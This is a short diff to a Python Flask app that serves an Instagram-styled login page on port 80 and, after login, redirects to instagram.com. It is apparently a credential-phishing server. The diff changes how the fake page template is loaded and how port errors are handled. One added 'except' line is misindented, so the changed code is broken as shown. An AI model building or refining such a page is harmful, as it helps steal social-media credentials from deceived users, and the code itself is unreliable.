@@ -1,6 +1,7 @@
 import os
 from flask import Flask, request, redirect, render_template_string
 import datetime
+from pathlib import Path
 
 app = Flask(__name__)
 
@@ -27,13 +28,13 @@ def login():
        
         return redirect("https://www.instagram.com", code=302)
    
-    return render_template_string(INSTAGRAM_PAGE_HTML)
+    return render_template_string(load_index_html())
 
 
 if __name__ == '__main__':
     port = 80
     try:
         app.run(host='0.0.0.0', port=port)
-    except Exception as e:
-        print(f"Порт {port} занят. Запуск на 5000...")
+     except OSError:
+        print(f"Порт {port} зайнятий. Запуск на 5000...")
         app.run(host='0.0.0.0', port=5000)
